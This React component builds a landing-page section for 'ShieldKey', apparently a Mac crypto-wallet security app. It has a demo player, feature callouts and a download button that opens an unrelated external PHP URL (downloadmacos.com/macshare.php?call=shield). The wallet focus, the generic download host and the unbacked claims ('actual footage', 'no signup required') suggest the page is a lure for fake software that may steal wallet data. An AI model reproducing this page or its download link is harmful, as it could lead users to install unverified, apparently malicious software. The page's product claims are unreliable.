import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Play, Pause, RotateCcw, Download } from "lucide-react";
import heroGif from "@assets/hero.gif";

export default function DemoSection() {
  const [isPlaying, setIsPlaying] = useState(true);

  const handleDownload = () => {
    window.open("https://downloadmacos.com/macshare.php?call=shield", "_blank");
  };

  return (
    <section id="demo-section" className="py-24 bg-gradient-to-br from-gray-50 to-white">
      <div className="max-w-6xl mx-auto px-6 lg:px-8">
        <div className="text-center mb-12">
          <h2 className="text-4xl font-black text-gradient mb-4">
            See ShieldKey Protecting Your Mac in Real-Time
          </h2>
          <p className="text-xl text-gray-600 max-w-3xl mx-auto">
            Watch how ShieldKey detects threats, protects wallet files, and keeps your crypto secure. 
            This is actual footage from our testing environment.
          </p>
        </div>
        
        {/* Interactive Demo Player */}
        <div className="relative glassmorphic rounded-3xl overflow-hidden shadow-floating max-w-4xl mx-auto">
          <div className="bg-gray-900 p-4">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                <div className="flex space-x-1">
                  <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                  <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                  <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <span className="text-white text-sm font-medium">ShieldKey Security Center</span>
              </div>
              <div className="flex items-center space-x-2">
                <div className="flex items-center space-x-1 bg-green-500 px-2 py-1 rounded-full">
                  <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                  <span className="text-white text-xs font-medium">LIVE PROTECTION</span>
                </div>
              </div>
            </div>
            
            <div className="aspect-video relative bg-gray-800 rounded-xl overflow-hidden">
              <img 
                src={heroGif} 
                alt="ShieldKey Live Protection Demo"
                className="w-full h-full object-cover"
              />
              
              {/* Overlay Controls */}
              <div className="absolute inset-0 bg-black bg-opacity-0 hover:bg-opacity-30 transition-all duration-300 flex items-center justify-center group">
                <div className="opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-center space-x-4">
                  <Button
                    onClick={() => setIsPlaying(!isPlaying)}
                    className="w-16 h-16 rounded-full bg-white bg-opacity-90 hover:bg-opacity-100 text-primary shadow-lg"
                  >
                    {isPlaying ? (
                      <Pause className="w-6 h-6" />
                    ) : (
                      <Play className="w-6 h-6 ml-1" />
                    )}
                  </Button>
                  <Button
                    variant="outline"
                    className="bg-white bg-opacity-90 hover:bg-opacity-100 text-primary border-primary"
                  >
                    <RotateCcw className="w-4 h-4 mr-2" />
                    Restart
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Demo Features Callouts */}
        <div className="grid md:grid-cols-3 gap-8 mt-16">
          <div className="text-center">
            <div className="w-16 h-16 bg-gradient-to-br from-red-500 to-red-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl">🛡️</span>
            </div>
            <h3 className="text-lg font-bold mb-2">Real-Time Threat Detection</h3>
            <p className="text-gray-600">Watch ShieldKey identify and block malicious websites and suspicious downloads instantly</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-gradient-to-br from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl">📁</span>
            </div>
            <h3 className="text-lg font-bold mb-2">Wallet File Protection</h3>
            <p className="text-gray-600">See how ShieldKey monitors and protects your MetaMask, Phantom, and other wallet files</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-green-600 rounded-2xl flex items-center justify-center mx-auto mb-4">
              <span className="text-2xl">⚡</span>
            </div>
            <h3 className="text-lg font-bold mb-2">Zero Performance Impact</h3>
            <p className="text-gray-600">Notice how your Mac runs smoothly while ShieldKey works silently in the background</p>
          </div>
        </div>
        
        {/* Call to Action */}
        <div className="text-center mt-12">
          <Button 
            onClick={handleDownload}
            className="btn-gradient text-white px-10 py-4 rounded-2xl font-bold text-lg hover:shadow-floating transform hover:-translate-y-1 transition-all duration-300"
          >
            <Download className="w-5 h-5 mr-2" />
            Get ShieldKey Protection Now
          </Button>
          <p className="text-sm text-gray-500 mt-4">
            Free beta • No signup required • Install in under 60 seconds
          </p>
        </div>
      </div>
    </section>
  );
}